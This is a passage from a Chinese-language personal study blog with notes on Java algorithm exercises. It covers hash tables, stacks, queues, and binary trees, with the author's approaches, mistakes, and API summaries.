<span class="variable">last</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">...</span><br><span class="line">        first = Math.min(first,i);</span><br><span class="line">        last = Math.max(last,i);</span><br></pre></td></tr></table></figure><h3 id="总结之哈希表"><a href="#总结之哈希表" class="headerlink" title="总结之哈希表"></a>总结之哈希表</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>LRU的实现是：hashMap&lt;Integer,DlinkedNode&gt; + DlinkedNode双向链表，表头添加，表尾删除。其中双向链表定义时，要定义首尾两个虚节点head、tail，这与单链表中单独的dummy节点有所区别。这道题比较有代表性，估计下次还是很难直接做出来。</span><br><span class="line"><span class="number">2.</span>LinkedHashMap的使用：继承LinkedHashMap，重写removeEldestEntry方法，写出用于“删除最早添加节点”的布尔表达式。</span><br><span class="line"><span class="number">3.</span>如果哈希表的键取值范围固定，并不是很大，则可以用数组模拟哈希表。例如，单词中只包含英文小写字母，那么就可以用一个长度为<span class="number">26</span>的数组来模拟这个哈希表。</span><br><span class="line"><span class="number">4.</span>常用api：</span><br><span class="line"> hashMap.put(ch,hashMap.getOrDefault(ch,<span class="number">0</span>)+<span class="number">1</span>);  <span class="comment">//getOrDefault，如果不存在该键就返回默认值0，省去判断</span></span><br><span class="line"> hashmap.putIfAbsent(key, value);<span class="comment">//先判断指定的键（key）是否存在，不存在则将键/值对插入到HashMap中。</span></span><br><span class="line"><span class="number">5.</span>后半部分hashMap的应用每道题关联不大，可能也是状态不太好，几道题都没有第一想法。</span><br></pre></td></tr></table></figure><h2 id="第六章、栈"><a href="#第六章、栈" class="headerlink" title="第六章、栈"></a>第六章、栈</h2><h3 id="036、后缀表达式（150、9月6日）"><a href="#036、后缀表达式（150、9月6日）" class="headerlink" title="036、后缀表达式（150、9月6日）"></a>036、后缀表达式（150、9月6日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，栈。遇到操作符，就弹两次栈进行运算，并将结果压回栈中；遇到其他（数字）字符，就直接压栈；最后返回栈顶元素。</span><br><span class="line"><span class="number">2.</span>这道题比较不优雅的地方，是要对运算符进行分类，题解用了<span class="keyword">switch</span> <span class="keyword">case</span>，<span class="keyword">default</span>时说明是数字直接压栈，我用的是<span class="keyword">if</span>...<span class="keyword">else</span>。此外，可以直接用isNumber判断是否为数字，比我的List&lt;String&gt;.contains(操作符)更紧凑些，没啥难的。</span><br></pre></td></tr></table></figure><h3 id="037、小行星碰撞（735、9月6日）"><a href="#037、小行星碰撞（735、9月6日）" class="headerlink" title="037、小行星碰撞（735、9月6日）"></a>037、小行星碰撞（735、9月6日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，双栈。维护两个栈记录向左走和向右走的小行星，如果将向左走的小行星压栈时，向右走的栈顶有小行星，则比较后决定两颗行星的去留，反之亦然。最后将没有空的栈元素取出，组装成<span class="type">int</span>[]数组返回。这种想法的错误是，题目说“表示在同一行的小行星”，如果最左边的小行星决定向左移动，那天王老子也炸不了它，并不是围绕恒星，即这个题目不但考虑方向，还要考虑位置。</span><br><span class="line"><span class="number">2.</span>我的想法，单栈。终究是做出来了，是一道考虑特殊情况的题目。维护向右走小行星的栈，也维护向左走小行星的List，这样考虑：</span><br><span class="line">    （<span class="number">1</span>）.如果小行星向左走：</span><br><span class="line">    a.栈为空，直接在List中添加小行星；</span><br><span class="line">    b.栈不为空，满足(!stack.isEmpty()&amp;&amp;stack.peek()&lt;-asteroid)条件下弹栈，直到向右走小行星全军覆没或挡住这颗行星。接下来，如果全军覆没则在List中添加这颗，如果恰好相等则弹栈，如果大于则不管；</span><br><span class="line">    （<span class="number">2</span>）.如果小行星向右走则直接压栈；</span><br><span class="line">    （<span class="number">3</span>）.如果栈不为空则通过pollLast依次获取栈底元素；</span><br><span class="line">    避免pollLast（栈底），可以改为<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> size - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)，这样能从栈顶弹。</span><br><span class="line">    （<span class="number">4</span>）.List通过size转<span class="type">int</span>[size]，实在找不到高端api；</span><br><span class="line"><span class="number">3.</span>思路<span class="number">1</span>，单栈。题解是把朝两个方向运动的小行星都入栈，设置<span class="type">boolean</span>值alive，为每一颗向左走的小行星给一条命，只有它能：</span><br><span class="line">    alive &amp;&amp; aster &lt; <span class="number">0</span> &amp;&amp; !stack.isEmpty() &amp;&amp; stack.peek() &gt; <span class="number">0</span></span><br><span class="line">    栈为空，栈顶也是一颗向左走的小行星，没被向右走的小行星打爆或同归于尽，他才能入栈。</span><br></pre></td></tr></table></figure><h3 id="038、每日温度（739、9月6日）"><a href="#038、每日温度（739、9月6日）" class="headerlink" title="038、每日温度（739、9月6日）"></a>038、每日温度（739、9月6日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，栈。维护一个栈记录温度的索引号，从左到右遍历温度数组，</span><br><span class="line">    a.如果栈为空，就将当前温度直接压栈；</span><br><span class="line">    b.如果栈不为空，通过<span class="keyword">while</span>循环比较栈顶元素和当前温度的大小，</span><br><span class="line">    当栈顶元素对应温度&lt;当前温度时，在数组中记录对应索引的结果：result[stack.peek()] = i-stack.peek();</span><br><span class="line">    当当前温度不管小于、等于和大于栈顶温度，都需要将当前温度入栈；</span><br><span class="line">    c.最后，将栈中剩下的索引，把result数组对应位置置为<span class="number">0</span>；</span><br><span class="line">简单说下，就是栈里只记录处理不了的索引，能处理时则通过索引相减获得时间差距。这道题趴下头想一想就做出来了耶。 </span><br><span class="line"><span class="number">2.</span>关键词：栈存索引</span><br></pre></td></tr></table></figure><h3 id="【039、直方图最大矩形面积（84、9月7日）】"><a href="#【039、直方图最大矩形面积（84、9月7日）】" class="headerlink" title="【039、直方图最大矩形面积（84、9月7日）】"></a>【039、直方图最大矩形面积（84、9月7日）】</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，暴力破解。不知道为啥连穷举都想不出来，一直在想着怎么和栈上靠，还有怎么区分单柱和多柱组成的面积。题解中穷举思路很简单，从左往右遍历单柱，首先将目前单柱的高设为最低，然后从目前单柱开始不断更新最低柱高，并更新最低柱高下的面积。卡在超时上。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">2</span>，分治法。最大矩形面积受限于最低柱高，对于接触过最低柱高的矩形来说，最大矩形面积是全局的面积；此时只有最低柱高左侧的情况，或者最低柱高右侧的情况，可能超过最大矩形。单独分析左侧情况时，问题回到和全局类似，因此用分治法。（关键词，低柱两边）</span><br><span class="line"><span class="number">3.</span>思路<span class="number">3</span>，单调栈。这也太难了，今晚太饿没有精力想明白。（没做出来）</span><br></pre></td></tr></table></figure><h3 id="【040、矩阵中最大的矩形（85、9月7日）】"><a href="#【040、矩阵中最大的矩形（85、9月7日）】" class="headerlink" title="【040、矩阵中最大的矩形（85、9月7日）】"></a>【040、矩阵中最大的矩形（85、9月7日）】</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，单调栈。将矩阵转换为题目<span class="number">39</span>中的直方图，什么神仙脑洞。（没做出来）</span><br></pre></td></tr></table></figure><h3 id="总结之栈"><a href="#总结之栈" class="headerlink" title="总结之栈"></a>总结之栈</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>栈相关api记录复制：</span><br><span class="line">Deque&lt;ListNode&gt; stack = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        peek()：返回栈顶的值 ；不改变栈的值，查看栈顶的对象而不移除它。</span><br><span class="line">        pop()：Stack(栈)的方法，返回栈顶的值 ；会把栈顶的值删除。</span><br><span class="line">        poll：Queue(队列)的一个方法，获取并移除此队列的头，如果此队列为空，则返回<span class="literal">null</span>。</span><br><span class="line">        pollLast：Dueue(队列)的一个方法，能获取队列尾部，需要记住这里队列首部才是栈顶，而poll和pollFirst等价于pop。</span><br><span class="line">    Stack&lt;Integer&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line"><span class="number">2.</span>Queue是队列；Deque是双端队列，支持在两端插入和移除元素，因此可以用它模拟栈。</span><br><span class="line"><span class="number">3.</span>将栈中结果按原顺序返回：<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> size - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) result[i]=stack.pop();</span><br></pre></td></tr></table></figure><h2 id="第七章、队列"><a href="#第七章、队列" class="headerlink" title="第七章、队列"></a>第七章、队列</h2><h3 id="041、滑动窗口的平均值（346、9月10日）"><a href="#041、滑动窗口的平均值（346、9月10日）" class="headerlink" title="041、滑动窗口的平均值（346、9月10日）"></a>041、滑动窗口的平均值（346、9月10日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，队列。这道题比较简单，就是维护队列、队列最高容量和窗口内数值和这<span class="number">3</span>个变量。当队列容量到达最高容量时，从队列头部删除元素，窗口数值和减去该元素，并将新元素添加到队列尾部并加给数值和。通过维护窗口数值和sum，就不需要再遍历整个滑动窗口了。</span><br><span class="line"><span class="number">2.</span>在队列尾部添加元素api：</span><br><span class="line">offer(): 在队列尾部添加新元素，如果队列已满，返回<span class="literal">false</span>，add方法会抛出异常；</span><br></pre></td></tr></table></figure><h3 id="042、最近请求次数（933、9月11日）"><a href="#042、最近请求次数（933、9月11日）" class="headerlink" title="042、最近请求次数（933、9月11日）"></a>042、最近请求次数（933、9月11日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，队列。这道题比较简单，就是维护队列，当调用ping时，通过<span class="keyword">while</span>循环检查window.peek()&lt;t-<span class="number">3000</span>，并移除。</span><br></pre></td></tr></table></figure><h3 id="043、往完全二叉树添加节点（919、9月11日）"><a href="#043、往完全二叉树添加节点（919、9月11日）" class="headerlink" title="043、往完全二叉树添加节点（919、9月11日）"></a>043、往完全二叉树添加节点（919、9月11日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>完全二叉树，叶子节点只会出现在最下层和次下层，只有最下层不满且叶子节点集中出现在左侧。满二叉树是完全二叉树的特例。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，队列解决广度优先遍历。用队列解决广度优先遍历，是一种经典的方法，当遍历到某层节点时，将其左右子节点分别放入队列，这样就能保持广度优先遍历。每次遍历将父节点从队列前端poll掉，又在队列尾端offer其左右子节点。本题中需注意：</span><br><span class="line">    a.在构造函数记录root根节点后，就将root节点放入队列，提取其左右节点后在队列中删除root节点，并不断重复这一操作，直到某节点不具备左子节点或者右子节点跳出循环。要注意这个节点的左、右子节点都没有放入队列；</span><br><span class="line">    b.当insert新节点时，队列中存储的就是这个不完全节点，设置该节点的left或right属性，只有在right属性设置完毕，才能从队列中删除该不完全节点，并将left和right加入队列；因为这里存在一种特殊情况，如果不完全节点有left属性，而判断right==<span class="literal">null</span>的逻辑中只加入right到队列，就会使left节点没有放入，构造函数中并没有把这个left放入；</span><br><span class="line">    c.当get_root时，返回最初记录的root节点即可，队列中并不存放完整树，而是存放当前遍历到的节点；</span><br></pre></td></tr></table></figure><h3 id="044、二叉树每层的最大值（515、9月11日）"><a href="#044、二叉树每层的最大值（515、9月11日）" class="headerlink" title="044、二叉树每层的最大值（515、9月11日）"></a>044、二叉树每层的最大值（515、9月11日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，广度优先遍历。为每层维护一个len，记录该层节点数目，通过<span class="keyword">while</span>(len&gt;<span class="number">0</span>)遍历队列中节点，通过Math.max(maxVaule,t.val)更新该层最大值，将其子节点加入队列。这样当len为<span class="number">0</span>时跳出循环，队列中为新的一层节点，len更新为新层的节点数目，并重复上述。（关键词，len记录层节点数目）</span><br><span class="line"><span class="number">2.</span>思路<span class="number">2</span>，深度优先遍历。深度优先遍历时，假如访问root后再访问root.left，这时result.size为<span class="number">1</span>，深度<span class="number">0</span>+<span class="number">1</span>=<span class="number">1</span>，深度==result.size，这时就能把root.left节点的值放入到result。即最先遍历到该层的节点先将值放入result占位，后来再遍历到该层其他节点时，在result中更新该层深度对应的值。（关键词，通过深度在result中索引）</span><br></pre></td></tr></table></figure><h3 id="045、二叉树最底层最左边的值（513、9月11日）"><a href="#045、二叉树最底层最左边的值（513、9月11日）" class="headerlink" title="045、二叉树最底层最左边的值（513、9月11日）"></a>045、二叉树最底层最左边的值（513、9月11日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，广度优先遍历。为每层维护一个len，记录该层节点数目，通过<span class="keyword">while</span>(len&gt;<span class="number">0</span>)遍历队列中节点。当遍历到新层时，len更新为该层的节点数目，并将result更新为当前队列头部元素的值。这道题和第<span class="number">44</span>题广度解法一致。（关键词，len记录层节点数目）</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，广度优先遍历。从右往左遍历队列中的节点，这样最底层最左边的元素，就是被最后一个访问到，记录该值即可。（关键词，从右往左）</span><br><span class="line"><span class="number">3.</span>思路<span class="number">2</span>，深度优先遍历。用height记录遍历到的节点高度，用curHeight记录上一次更新result的高度。遍历每个节点时，先深度遍历其左子节点，再深度遍历其右子节点，直到子节点为<span class="literal">null</span>时返回。由于只在超过curHeight时才更新curHeight和result，因此到达最底层时只会更新依次result。（关键词，存档点）</span><br><span class="line">    注意，这里将curHeight和result设置为类变量，不放入函数参数，这里涉及到修改形参的知识。</span><br></pre></td></tr></table></figure><h3 id="046、二叉树的右侧视图（199、9月11日）"><a href="#046、二叉树的右侧视图（199、9月11日）" class="headerlink" title="046、二叉树的右侧视图（199、9月11日）"></a>046、二叉树的右侧视图（199、9月11日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，广度优先遍历。为每层维护一个len，记录该层节点数目，通过<span class="keyword">while</span>(len&gt;<span class="number">0</span>)遍历队列中节点。当每层len变为<span class="number">0</span>时，说明正在访问该层的最右侧节点，将节点值放入result。这道题和第<span class="number">44</span>题广度解法一致。（关键词，len记录层节点数目）</span><br></pre></td></tr></table></figure><h3 id="总结之队列"><a href="#总结之队列" class="headerlink" title="总结之队列"></a>总结之队列</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>队列相关api记录复制：</span><br><span class="line">Deque&lt;ListNode&gt; stack = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();  <span class="comment">//队列是尾部添加，头部删除</span></span><br><span class="line">offer(): 在队列尾部添加新元素，如果队列已满，返回<span class="literal">false</span>。add方法会抛出异常；</span><br><span class="line">poll()：获取并移除此队列的头，如果此队列为空，则返回<span class="literal">null</span>。remove方法会抛出异常；</span><br><span class="line"> peek()：用于在队列头部查询元素，如果此队列为空，返回<span class="literal">null</span>。element方法会抛出异常；</span><br><span class="line"><span class="number">2.</span>用队列解决广度优先遍历：这是一种经典的方法，当遍历到某层节点时，将其左右子节点分别放入队列，这样就能保持广度优先遍历。每次遍历将父节点从队列前端poll掉，又在队列尾端offer其左右子节点。</span><br><span class="line"><span class="number">3.</span>java改变传入参数的值（在深度优先遍历、回溯时经常遇到）：</span><br><span class="line">对于基本数据类型，实现的是传值，只是个形参，不会改变原有值。对于引用数据类型，对这个引用进行操作，其实也是相当于对形参的操作，不会改变原来的引用。但是，当对这个引用的属性进行操作的时候，相当于CPP中的传址调用，可以改变这个引用的属性的值。</span><br><span class="line">即修改形参，基本类型不会改变值，引用类型会改变值。如果是类变量，则会更加清晰必然修改。</span><br><span class="line"><span class="number">4.</span>队列问题的体会：</span><br><span class="line">a.队列从来不作为完整存储容器，不是作为滑动窗口，就是为树存储当前遍历到的节点；</span><br><span class="line">b.用队列做广度优先遍历是经典方法，堪比反转链表，只要记住维护len变量记录层节点数目即可；</span><br><span class="line">c.遍历访问树节点时，判断左右子树是否存在，不用<span class="keyword">if</span>...<span class="keyword">else</span>，而是<span class="keyword">if</span>、<span class="keyword">if</span>单独判断，比如只有右子树存在的情况，<span class="keyword">if</span>...<span class="keyword">else</span>就不好。</span><br></pre></td></tr></table></figure><h2 id="第八章、树"><a href="#第八章、树" class="headerlink" title="第八章、树"></a>第八章、树</h2><h3 id="047、二叉树剪枝（814、9月11日）"><a href="#047、二叉树剪枝（814、9月11日）" class="headerlink" title="047、二叉树剪枝（814、9月11日）"></a>047、二叉树剪枝（814、9月11日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，深度优先遍历。dfs函数设置布尔返回值，对于每个节点，如果左子树、右子树或者本身含<span class="number">1</span>（满足任何一个），则立刻返回<span class="literal">true</span>，否则返回<span class="literal">false</span>。如果深度遍历到最底层<span class="literal">null</span>还没返回，说明这棵子树不含<span class="number">1</span>，返回<span class="literal">false</span>；当左、右子树不含<span class="number">1</span>时，将其置为<span class="literal">null</span>。</span><br><span class="line">注意，当输入全<span class="number">0</span>的树时，dfs处理后只剩根节点[<span class="number">0</span>]，但这不符合输出要求。此时，左右子树均为<span class="literal">null</span>，且标志位为<span class="literal">false</span>，要根据标志位决定是返会root节点，还是直接返回<span class="literal">null</span>，而不是<span class="keyword">new</span> <span class="title class_">TreeNode</span>()。（关键词，左右<span class="number">2</span>个标志位）</span><br></pre></td></tr></table></figure><h3 id="048、序列化与反序列化树（297、9月12日）"><a href="#048、序列化与反序列化树（297、9月12日）" class="headerlink" title="048、序列化与反序列化树（297、9月12日）"></a>048、序列化与反序列化树（297、9月12日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，<span class="string">&#x27;,&#x27;</span>分割+满二叉树+队列实现广度优先遍历。这道题是困难题，结合了StringBuilder、字符串分割、和队列等知识，但我竟然本地调试后，提交一次就通过了，简直unbelievable！！耍！</span><br><span class="line">（<span class="number">1</span>）序列化时，</span><br><span class="line">    a.每层节点当其本身不等于<span class="literal">null</span>时，就将其值放入StringBuilder，并将左、右子节点放入队列（不管是否为<span class="literal">null</span>）；</span><br><span class="line">    b.等于<span class="literal">null</span>时，就将“<span class="literal">null</span>,”放入StringBuilder，这样能实现满二叉树，底层没有元素的位置会被填入<span class="literal">null</span>，且<span class="literal">null</span>节点的孩子节点不会被放入队列；</span><br><span class="line">    c.输出字符串<span class="string">&quot;1,2,3,null,null,4,5,null,null,null,null,&quot;</span>；</span><br><span class="line">（<span class="number">2</span>）反序列化时，</span><br><span class="line">    a.先通过split(<span class="string">&quot;,&quot;</span>)将节点数值分割出来，再根据索引遍历，最后一个逗号后面的空不会被设为字符；</span><br><span class="line">    b.遍历时，先peek队列头部，再将本字符串转为TreeNode，如果不为<span class="literal">null</span>，则加入队列；先peek是考虑到，首字符串放入队列再peek得到的是它本身；</span><br><span class="line">    c.这时候队列维护的是“没被安装左、右子节点的parent节点”，观察到对于满二叉树，索引为奇数时是左子节点，为偶数时是右子节点，根据这一规律，在队列头部节点被安装好后poll掉它；且要设置root变量记住根节点，以便返回；（关键词，满二叉树）</span><br></pre></td></tr></table></figure><h3 id="049、从根节点到叶节点的路径数字之和（129、9月12日）"><a href="#049、从根节点到叶节点的路径数字之和（129、9月12日）" class="headerlink" title="049、从根节点到叶节点的路径数字之和（129、9月12日）"></a>049、从根节点到叶节点的路径数字之和（129、9月12日）</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.思路1，深度优先搜索。因为路径相关问题，大都采用深度优先搜索。这道题用dfs更方便的原因，还在于通过path = path*10+root.val;求当前累积和，比如路径为3-&gt;9-&gt;5，3*10+9=39，39*10+5=395，就能直接把路径数字表示出来。</span><br><span class="line">对于每个节点，返回其左、右子树的累积结果时，直接return dfs(root.left,path)+dfs(root.right,path)，比如path=39，391+395=...，这都是从数值为9的节点开始的全部路径和。注意叶子节点为null，则返回0。（关键词，dfs相加）</span><br></pre></td></tr></table></figure><h3 id="050、向下的路径节点之和（437、9月12日）"><a href="#050、向下的路径节点之和（437、9月12日）" class="headerlink" title="050、向下的路径节点之和（437、9月12日）"></a>050、向下的路径节点之和（437、9月12日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，深度优先搜索+前缀和+回溯。咋这几道中等题反而越来越难想嘞？因为题目要求统计次数，故通过hashMap记录前缀和即可，键为当前累积和path，值为path的出现次数。</span><br><span class="line">    a.对于一条路径，不断深入的过程中path加上节点值，并使得hashMap中path对应的值增加<span class="number">1</span>，每次更新当前累积和path时，在hashMap中寻找(path-target)的出现次数，即为这条路径能提供的目标子串数目；</span><br><span class="line">    b.还要像题目<span class="number">49</span>，把path向左、右子节点传递下去，子节点dfs返回后，要将hashMap中path对应的值减<span class="number">1</span>，抹除本路径、本节点的影响，这样便是回溯。（关键词，前缀和、）</span><br><span class="line"><span class="number">2.</span>这道题的测试用例被添加了奇怪的东西，必须将path设置为<span class="number">64</span>位的Long。</span><br><span class="line"><span class="number">3.</span>DFS的代码都很短，但是想到却很困难。对于root节点到叶子节点的全部路径，或者从任意节点开始的部分路径，dfs怎样操作子节点还是不能轻松想到。再次遇到求部分和次数的题目，看来子数组、子串、子路径都要记住hashMap前缀和的方法。</span><br></pre></td></tr></table></figure><h3 id="051、节点之和最大的路径（124、9月12日）"><a href="#051、节点之和最大的路径（124、9月12日）" class="headerlink" title="051、节点之和最大的路径（124、9月12日）"></a>051、节点之和最大的路径（124、9月12日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，深度优先搜索。题目没有对路径限制，那对于每个节点有<span class="number">3</span>种情况，但我分析不出返回值该是啥：</span><br><span class="line">    a.b.从其他节点延申过来，经过其左子树或者右子树的路径；</span><br><span class="line">    c.从其左子树开始，经过本节点，再经过其右子树的路径；</span><br><span class="line">我的疑虑主要在，从root节点到某子节点的路径和某节点自身的左右两边路径，这两种情况怎么设计返回值？</span><br><span class="line">    </span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，深度优先搜索。对于每个节点来说，返回值是其本身的值，加上左子树或者右子树返回的值或者<span class="number">0</span>，这样它不是这条路径的核心，不同时提供左右子树，只提供一个边；对于每个节点来说(想象成root节点)，它通过比较左、右子树的返回值、以及两个返回值加上它本身这<span class="number">3</span>个对象，就能覆盖其节点上的最值信息。（关键词，返回root.val+max(left,right)）</span><br><span class="line"><span class="number">3.</span>这道题很困难，代码简单能量爆炸。</span><br></pre></td></tr></table></figure><h3 id="052、展平二叉搜索树（897、9月13日）"><a href="#052、展平二叉搜索树（897、9月13日）" class="headerlink" title="052、展平二叉搜索树（897、9月13日）"></a>052、展平二叉搜索树（897、9月13日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，二叉树中序遍历。因为二叉搜索树本身就维护了递增顺序，只需对其中序遍历，将节点放入List，再按照List中的顺序连接。连接时需要将每个节点的左指针置为空，右指针指向List下一节点，最后节点右指针置为空，记住新的root节点即可。（关键词，中序遍历）</span><br><span class="line">    本题中序遍历用dfs递归实现。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，二叉树中序遍历。List中可以不放节点，而是放节点值，重组时新建节点。</span><br><span class="line"><span class="number">3.</span>二叉搜索树，左子节点总是小于或等于根节点，而右子节点总是大于或等于根节点。</span><br></pre></td></tr></table></figure><h3 id="053、二叉搜索树中的中序后继（285、9月13日）"><a href="#053、二叉搜索树中的中序后继（285、9月13日）" class="headerlink" title="053、二叉搜索树中的中序后继（285、9月13日）"></a>053、二叉搜索树中的中序后继（285、9月13日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，栈实现中序遍历。设置标志位flag初始为<span class="literal">false</span>，栈实现中序遍历代码中，弹栈时当前节点等于目标节点，则将标志位flag置为<span class="literal">true</span>。由于当前节点的右指针为<span class="literal">null</span>时会弹栈，这时flag等于<span class="literal">true</span>跳出循环，当前节点就是目标节点。（关键词，栈实现、标志位）</span><br><span class="line"><span class="number">2.</span>本来准备用dfs递归实现，但在函数递归调用中传递标志位，并考虑返回值好麻烦，没找到时返回值咋设置。</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>思路<span class="number">2</span>，二叉搜索树。二叉搜索树自身就有排序功能，能根据其性质按照正确的方向去寻找，每个节点比目标值大则向左找，否则向右。注意只在比目标值大时，才将结果节点result更新储存当前节点，因为接下来往左找时新的当前节点值可能小于等于目标值，等于时result中确实存储其中序后继，小于时则不可能是中序后继。（关键词，大于目标是更新result）</span><br></pre></td></tr></table></figure><h3 id="054、所有大于等于节点的值之和（538、1038、9月13日）"><a href="#054、所有大于等于节点的值之和（538、1038、9月13日）" class="headerlink" title="054、所有大于等于节点的值之和（538、1038、9月13日）"></a>054、所有大于等于节点的值之和（538、1038、9月13日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，递归实现先遍历右子树。这道题一看涉及到累积和path，那肯定传参path，返回path。因为是二叉搜索树，根据题目应该先访问右节点，再中间节点，最后是左节点。dfs辅助函数根据前面的遍历顺序修改path值，注意如果节点等于<span class="literal">null</span>，应该返回path而不是返回<span class="number">0</span>，因为dfs函数返回的是修改后的path值，而不是修改量。（关键词，反序中序遍历）</span><br></pre></td></tr></table></figure><h3 id="055、二叉搜索树迭代器（173、9月15日）"><a href="#055、二叉搜索树迭代器（173、9月15日）" class="headerlink" title="055、二叉搜索树迭代器（173、9月15日）"></a>055、二叉搜索树迭代器（173、9月15日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，栈实现中序遍历。这道题看了很多遍不知道到底在说什么，就看了题解。next函数是返回二叉搜索树中下一个最小的节点值，因此每次访问next函数，先不断调用next指针并压栈使其触底，next弹栈一个元素取值后，将当前节点指向右指针，即完成了中序遍历。</span><br><span class="line">    （关键词，栈实现中序遍历）</span><br></pre></td></tr></table></figure><h3 id="056、二叉搜索树中两个节点之和（653、9月15日）"><a href="#056、二叉搜索树中两个节点之和（653、9月15日）" class="headerlink" title="056、二叉搜索树中两个节点之和（653、9月15日）"></a>056、二叉搜索树中两个节点之和（653、9月15日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，栈实现中序遍历+hashMap。这几道题都考察栈实现中序遍历，只需在弹栈时，在hashMap中寻找(k-val)，并将val加入hashMap，找到则返回<span class="literal">true</span>，双层<span class="keyword">while</span>循环结束则返回<span class="literal">false</span>。（关键词，栈实现中序遍历）</span><br><span class="line"><span class="number">2.</span>思路<span class="number">2</span>，双指针，先不做。</span><br></pre></td></tr></table></figure><h3 id="057、值和下标之差都在给定的范围内（220、9月15日）"><a href="#057、值和下标之差都在给定的范围内（220、9月15日）" class="headerlink" title="057、值和下标之差都在给定的范围内（220、9月15日）"></a>057、值和下标之差都在给定的范围内（220、9月15日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，TreeMap。维护一个TreeMap，键为数字，值为它在数组中的最新索引。从左向右遍历数组，取TreeMap中恰好小于等于（floor）、大于等于（ceiling）当前遍历数字的键，计算其是否满足要求，并将当前遍历数字和索引放入TreeMap。但是，这么做存在问题，假设（&#123;<span class="number">10</span>,<span class="number">100</span>,<span class="number">11</span>,<span class="number">9</span>&#125;，索引=<span class="number">1</span>，差值=<span class="number">2</span>）的数字，当遍历到<span class="number">9</span>时，ceiling会取<span class="number">10</span>，从而不满足条件，即使<span class="number">11</span>满足但不在逻辑中。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，TreeSet。维护一个TreeSet，键为数字，这里把它当作滑动窗口，当超过k时，就剔除nums[i-k]。其他步骤同上。此外，为了应付一些特殊测试用例，应该强制类型转换成<span class="number">64</span>位的<span class="type">long</span>。（关键词，滑动窗口）</span><br></pre></td></tr></table></figure><h3 id="058、日程表（729、9月15日）"><a href="#058、日程表（729、9月15日）" class="headerlink" title="058、日程表（729、9月15日）"></a>058、日程表（729、9月15日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，TreeMap。维护一个TreeMap，键为start，值为end。每次book时，（关键词，TreeMap）</span><br><span class="line">    a.先取小于等于start的最大键值对，如果value大于start，则返回<span class="literal">false</span>；</span><br><span class="line">    b.再取大于等于start的最小键值对，如果key小于end，则返回<span class="literal">false</span>；</span><br><span class="line">    因为题目规定[start,end)，因此再判断大小时，相等是没问题的，即首尾重合没有问题。</span><br><span class="line"><span class="number">2.</span>TreeSet和TreeMap使用起来很简单，遇到的题目，解题都是依次调用一遍floor和ceiling做判断，再put本元素即可。</span><br><span class="line"><span class="number">3.</span>HashMap和TreeMap是同级的，都继承AbstractMap。必须TreeMap&lt;Integer,Integer&gt; treeMap = <span class="keyword">new</span> <span class="title class_">TreeMap</span>&lt;&gt;();，如果前面Class为Map&lt;Integer,Integer&gt;，则会因为多态而失去TreeMap的方法。</span><br></pre></td></tr></table></figure><h3 id="总结之树"><a href="#总结之树" class="headerlink" title="总结之树"></a>总结之树</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>二叉树分类定义：</span><br><span class="line">满二叉树，除了叶子结点之外的每一个结点都有两个孩子结点；即只有有孩子，必然有两个；</span><br><span class="line">完全二叉树，除了最后一层之外的其他每一层都被完全填充，并且所有结点都保持向左对齐；和完美二叉树区别在，底层不一定完全填充；</span><br><span 